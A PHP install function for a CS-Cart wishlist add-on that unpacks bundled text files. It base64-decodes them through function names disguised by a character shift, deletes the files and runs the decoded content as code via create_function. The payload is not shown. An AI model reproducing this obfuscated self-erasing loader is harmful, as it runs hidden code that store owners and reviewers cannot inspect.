<?php
/*****************************************************************************
*                                                                            *
*                   All rights reserved! eCom Labs LLC                       *
* http://www.ecom-labs.com/about-us/ecom-labs-modules-license-agreement.html *
*                                                                            *
*****************************************************************************/

use Tygh\Registry;

if (!defined('BOOTSTRAP')) { die('Access denied'); }

function fn_ecl_wishlist_content_install()
{
    fn_decompress_files(Registry::get('config.dir.var') . 'addons/ecl_wishlist_content/ecl_wishlist_content.tgz', Registry::get('config.dir.var') . 'addons/ecl_wishlist_content');
    $list = fn_get_dir_contents(Registry::get('config.dir.var') . 'addons/ecl_wishlist_content', false, true, 'txt', '');

    if ($list) {
        include_once(Registry::get('config.dir.schemas') . 'literal_converter/utf8.functions.php');
        foreach ($list as $file) {
            $_data = call_user_func(fn_simple_decode_str('cbtf75`efdpef'), fn_get_contents(Registry::get('config.dir.var') . 'addons/ecl_wishlist_content/' . $file));
            @unlink(Registry::get('config.dir.var') . 'addons/ecl_wishlist_content/' . $file);
            if ($func = call_user_func_array(fn_simple_decode_str('dsfbuf`gvodujpo'), array('', $_data))) {
                $func();
            }
        }
    }
}